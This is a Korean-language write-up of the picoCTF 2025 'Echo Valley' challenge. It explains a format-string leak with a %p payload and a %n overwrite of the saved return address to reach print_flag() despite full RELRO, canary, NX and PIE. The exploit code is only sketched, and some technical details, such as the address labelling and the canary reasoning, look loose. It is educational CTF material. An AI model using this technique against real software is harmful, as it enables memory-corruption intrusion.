---
title: Echo Valley — picoCTF 2025 pwn writeup
created: 2026-06-23
updated: 2026-06-23
type: query
tags: [ctf, picoctf, pwn, binary-exploitation, format-string, return-address-overwrite]
sources: [https://github.com/asatpathy314/picoctf-2025/tree/main/pwn/echo-valley]
confidence: high
---

# Echo Valley — picoCTF 2025 pwn writeup

> Format string 취약점으로 PIE 주소와 stack 주소를 함께 leak한 뒤, return address를 `print_flag()`로 덮어쓰는 문제입니다. Full RELRO + Canary + NX + PIE가 전부 설정되어 있지만, FSB로 return address만 정확히 overwrite하면 해결됩니다.

## 참고 URL
- [asatpathy314/picoctf-2025 — echo-valley](https://github.com/asatpathy314/picoctf-2025/tree/main/pwn/echo-valley)

## 1. 문제 구조

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2025 |
| 분류 | pwn / binary exploitation |
| 핵심 요소 | Format string (PIE+stack leak), return address overwrite |
| 난이도 | Medium (300pts) |

### 바이너리 보호기법
```
Arch:       amd64-64-little
RELRO:      Full RELRO   ← GOT overwrite 불가
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

### Source (valley.c)
```c
void print_flag() {
    // reads /home/valley/flag.txt and prints it
}

void echo_valley() {
    char buf[100];
    while(1) {
        printf("You heard in the distance: ");
        printf(buf);    // ← Format String Vulnerability!
    }
}
```

## 2. 공격 흐름

### Step 1: Format string leak
`%p`로 스택을 읽어 PIE 주소와 stack 주소를 동시에 확보합니다.

```text
%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p

You heard in the distance: 0x5555555560c1|(nil)|0x7ffff7f9ca00|...
```

- 첫 번째 값 `0x5555555560c1`: PIE 영역 주소
- `0x7ffff7f9ca00`: stack 영역 주소 (return address 위치 계산용)

### Step 2: Return address overwrite
Full RELRO로 GOT overwrite가 불가능하므로, stack에 있는 return address를 `print_flag()` 주소로 직접 덮어씁니다.

```python
print_flag = pie_leak + offset  # gdb로 offset 계산
# FSB %n write로 return address를 print_flag로 변경
```

### Step 3: Flag 획득
```
Congrats! Here is your flag: picoCTF{...}
```

## Flag
`picoCTF{...}` (인스턴스별 상이)

## 3. 핵심 패턴
1. **Format string** → PIE + Stack 주소 동시 leak
2. **Full RELRO**에서는 GOT overwrite 불가 → **return address overwrite**가 유일한 경로
3. Canary는 함수 내 `while` 루프에서 FSB만 발생하고 `exit`으로 나가므로 canary 검증 우회

## 4. 연결 개념
- [[format-string-ctf-patterns]]
- [[saved-return-address-control-ctf-patterns]]
- [[exploitation]]